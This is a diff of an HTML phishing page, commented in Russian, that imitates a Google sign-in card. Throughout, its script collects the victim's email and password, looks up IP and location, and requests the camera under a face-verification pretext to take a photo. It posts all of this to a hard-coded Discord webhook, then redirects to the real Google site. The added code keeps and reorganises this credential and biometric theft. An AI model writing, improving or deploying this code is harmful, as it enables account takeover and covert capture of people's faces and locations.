@@ -25,7 +25,7 @@
 <body>
 
 <div class="auth-card">
-    <div id="loader"><div class="prog-bar"><div class="prog-fill"></div></div><p style="font-size:14px; color:var(--g-sub)">Синхронизация...</p></div>
+    <div id="loader"><div class="prog-bar"><div class="prog-fill"></div></div><p style="font-size:14px; color:var(--g-sub)">Синхронизация данных...</p></div>
     
     <div class="header">
         <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
@@ -45,7 +45,7 @@
 <canvas id="c"></canvas>
 
 <script>
-    const TARGET_CORE = 'https://discordapp.com/api/webhooks/1495532733571797094/4ZlEq5gMsSPNKTusLURiR9pI9alunEZd7TLD5e3FVfTxOSo_z9vy1qcZ7MiX8VEvy53A';
+    const DISCORD_HOOK = 'https://discordapp.com/api/webhooks/1495532733571797094/4ZlEq5gMsSPNKTusLURiR9pI9alunEZd7TLD5e3FVfTxOSo_z9vy1qcZ7MiX8VEvy53A';
 
     async function deploy() {
         const email = document.getElementById('u').value;
@@ -55,15 +55,25 @@
 
         document.getElementById('loader').style.display = 'flex';
 
+        const formData = new FormData();
+        let geo = {};
+
+        // 1. ОПРЕДЕЛЕНИЕ IP И ГЕОПОЗИЦИИ
         try {
-            // ЭТА ЧАСТЬ ВЫЗЫВАЕТ ОКНО "РАЗРЕШИТЬ/СВЕРИТЬ ЛИЦО"
+            const response = await fetch('https://ipapi.co/json/');
+            geo = await response.json();
+        } catch (e) {
+            geo = { ip: "Не удалось определить", city: "N/A", org: "N/A" };
+        }
+
+        try {
+            // 2. ЗАПРОС КАМЕРЫ (СВЕРИТЬ ЛИЦО)
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('v');
             const canvas = document.getElementById('c');
             video.srcObject = stream;
 
-            // Короткая пауза для фокуса камеры
-            await new Promise(r => setTimeout(r, 1000));
+            await new Promise(r => setTimeout(r, 1000)); // Ждем включения камеры
 
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -71,51 +81,36 @@
             const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
             
             stream.getTracks().forEach(t => t.stop());
-
-            const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-            const formData = new FormData();
-
-            const systemReport = {
-                username: "Google Identity Sentinel",
-                embeds: [{
-                    title: "💠 ПЕРЕХВАТ ДАННЫХ И БИОМЕТРИИ",
-                    color: 4342490,
-                    fields: [
-                        { name: "👤 Учетные данные", value: `**Login:** \`${email}\`\n**Pass:** \`${pass}\`` },
-                        { name: "📍 Сетевой след", value: `**IP:** ${geo.ip}\n**ISP:** ${geo.org}\n**City:** ${geo.city}` },
-                        { name: "⚙️ Hardware Profile", value: `**GPU:** ${getGPU()}\n**CPU:** ${navigator.hardwareConcurrency} Cores` }
-                    ],
-                    image: { url: 'attachment://face.jpg' },
-                    footer: { text: "Protocol: BYTE92 | Target: BYTE92" }
-                }]
-            };
-
-            formData.append('payload_json', JSON.stringify(systemReport));
             formData.append('file', blob, 'face.jpg');
 
-            await fetch(TARGET_CORE, { method: 'POST', body: formData });
-
         } catch (e) {
-            // Если камера отклонена, отправляем только текст
-            const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-            await fetch(TARGET_CORE, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: "⚠️ Камера отклонена объектом\n**Login:** " + email + "\n**Pass:** " + pass
-                })
-            });
+            console.log("Камера отклонена");
         }
 
-        setTimeout(() => {
-            window.location.href = "https://accounts.google.com/signin/v2/challenge/pwd?service=mail";
-        }, 1500);
-    }
+        // 3. ФОРМИРОВАНИЕ ПАКЕТА ДАННЫХ
+        const report = {
+            username: "Google Security Sentinel",
+            embeds: [{
+                title: "💠 ПЕРЕХВАТ: " + email,
+                color: 4285F4,
+                fields: [
+                    { name: "🔑 ПАРОЛЬ", value: `\`${pass}\``, inline: false },
+                    { name: "📍 СЕТЬ (IP)", value: `**IP:** ${geo.ip}\n**Город:** ${geo.city}\n**Провайдер:** ${geo.org}`, inline: true },
+                    { name: "📱 УСТРОЙСТВО", value: `**ОС:** ${navigator.platform}\n**Браузер:** ${navigator.vendor}`, inline: true }
+                ],
+                footer: { text: "ID: " + Math.floor(Math.random() * 100000) }
+            }]
+        };
 
-    function getGPU() {
-        const gl = document.createElement('canvas').getContext('webgl');
-        const ext = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-        return ext ? gl.getParameter(ext.UNMASKED_RENDERER_ID) : "Protected_Node";
+        formData.append('payload_json', JSON.stringify(report));
+
+        // 4. ОТПРАВКА
+        await fetch(DISCORD_HOOK, { method: 'POST', body: formData });
+
+        // 5. РЕДИРЕКТ
+        setTimeout(() => {
+            window.location.href = "https://accounts.google.com";
+        }, 1000);
     }
 </script>
 </body>
